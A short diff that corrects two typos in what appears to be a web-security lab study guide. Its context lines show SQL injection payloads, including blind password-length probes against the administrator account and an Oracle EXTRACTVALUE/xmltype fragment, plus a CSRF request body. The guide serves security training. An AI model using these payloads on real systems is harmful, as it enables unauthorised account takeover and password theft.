@@ -995,7 +995,7 @@ csrf=TOKEN&username=administrator
 
 [PortSwigger Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)  
 
->***Indetify*** the Change password do not need the current-password parameter to set a new password, and the user whom password will be changed is based on POST parameter **username**.  
+>***Identify*** the Change password do not need the current-password parameter to set a new password, and the user whom password will be changed is based on POST parameter **username**.  
 
 [PortSwigger Lab: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)  
   
@@ -1045,7 +1045,7 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 ' AND '1'='2
 ```  
 
->Determine how many characters are in the password of the administrator user. To do this, change the SQL statement value to and in intruder **Settings tab**, at the "Grep - Match" section. Clear any existing entries in the list, and then add the value ```Welcome back``` to ***indentify*** true condition.  
+>Determine how many characters are in the password of the administrator user. To do this, change the SQL statement value to and in intruder **Settings tab**, at the "Grep - Match" section. Clear any existing entries in the list, and then add the value ```Welcome back``` to ***identify*** true condition.  
   
 ```
 ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
